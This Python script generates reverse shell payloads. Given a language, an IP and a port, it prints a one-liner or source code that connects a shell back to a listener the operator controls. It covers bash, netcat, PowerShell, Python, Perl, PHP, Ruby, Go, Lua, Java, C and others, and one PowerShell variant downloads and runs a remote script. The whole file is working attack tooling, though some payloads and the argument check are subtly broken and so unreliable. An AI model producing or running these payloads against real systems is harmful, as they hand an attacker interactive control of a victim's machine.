#!/bin/env python3                                                                                          
import sys                                                                                                  



def help():                                                   
                                                           
        print("\n\t      languages") 
        print("="*41)
        print("""awk      bash        bash-udp        c        
golang   java        lua lua-all     nodejs   
ncat     ncat-udp    netcat openssl  perl     
php      powershell  python          ruby     
socat    telnet      windows         xterm

netcat-busybox    netcat-openbsd
python3-windows    python2-windows""")
        print("="*41)
        print(f"\nFormat:{sys.argv[0]} <language> <ip> <port> ") 
        
        exit()

def parser():                                                 
        try:                                                        
                if sys.argv[1] not in service_commands:                                
                        help()                                                
               
                service = sys.argv[1]
                ip = sys.argv[2]
                port = sys.argv[3]  

                return service, ip, port          

        except IndexError:                                            
                help()                                                
   


def command(s, ip, port):  
        global service_commands   
        service_commands = {
                "golang":     'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' + ip +':' + port + '");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
                "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("' + ip + '",' + port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' , 
                "netcatBusy": f"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", 
                "windows":    f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}", 
                "awk":        "awk 'BEGIN {s = \"/inet/tcp/0/" + ip +"/" + port + "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null", 
                "netcatOpen": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", 
                "python":     f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'", 
                "bash":       f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"   , 
                "php":        f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'", 
                "perl":       "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", 
                "ruby":       f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'", 
                "netcat":     f"nc -e /bin/bash {ip} {port}",
                "java":       f"""r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor()""",
                "xterm":      f"xterm -display {ip}:{port}",
                
                "bash-udp":   f"Attacker: nc -u -lvp {port}\nVictom: sh -i >& /dev/udp/{ip}/{port} 0>&1",
                "socat":      f"Attackersocat file:`tty`,raw,echo=0 TCP-L:{port}Victum: /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
                "python3-windows": f"python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip}',{port}));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()\"",
                "python2-windows": "python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + ip + "', " + port + ")), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"",
                "ncat":            f"ncat {ip} {port} -e /bin/bash",
                "ncat-udp":        f"ncat --udp {ip} {port} -e /bin/bash",
                "openssl":         f"Attacker: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nAttcker: openssl s_server -quiet -key key.pem -cert cert.pem -port {port}\nVictom: /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
                "telnet":          f"Attacker: nc -lvp {port}\nAttacker: nc -lvp {port}\nVictom: telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
                "lua":             f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/bash -i <&3 >&3 2>&3');\"",
                "lua-all":         f'lua5.1 -e \'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'',
                "nodejs":          f"require('child_process').exec('nc -e /bin/bash {ip} {port}')",
                "c": ''' #include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = ''' + port + ''';
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("''' + ip + '''");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}'''
        }                                   



        print("\n" + service_commands[s])


if __name__ == "__main__":
        s, ip, port = parser()
        command(s, ip, port)
